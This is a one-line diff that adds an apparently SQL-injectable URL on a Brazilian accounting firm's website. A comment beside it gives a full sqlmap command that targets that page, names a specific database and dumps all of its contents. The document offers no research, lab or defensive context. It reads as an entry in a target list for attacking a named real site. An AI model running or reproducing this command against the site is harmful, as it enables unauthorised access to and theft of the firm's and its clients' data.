@@ -1,0 +1,1 @@
+http://www.contabilidadepatrimonio.com.br/noticias_view.php?id=3 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.contabilidadepatrimonio.com.br/noticias_view.php?id=3 -D contabilid108 --dump-all
